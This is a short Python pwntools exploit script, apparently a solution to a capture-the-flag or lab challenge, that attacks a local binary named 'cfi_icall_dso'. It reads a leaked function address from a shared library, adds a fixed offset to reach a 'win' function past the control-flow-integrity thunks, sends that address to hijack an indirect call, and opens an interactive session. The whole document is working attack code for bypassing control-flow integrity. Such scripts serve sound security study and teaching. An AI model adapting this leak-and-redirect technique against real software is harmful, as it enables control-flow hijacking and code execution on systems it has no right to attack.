#!/usr/bin/env python3

from pwn import *

elf = ELF("./cfi_icall_dso")

io = elf.process(["9"])
io.recvuntil(b"leak in .so: ")
int_func_leak = int(io.readline().decode().strip(), base=16)
win_addr = int_func_leak + 24 # (1 thunk + 3 int3s) = 8 bytes, and it's 3 functions away
io.sendline(hex(win_addr).encode())
io.interactive()
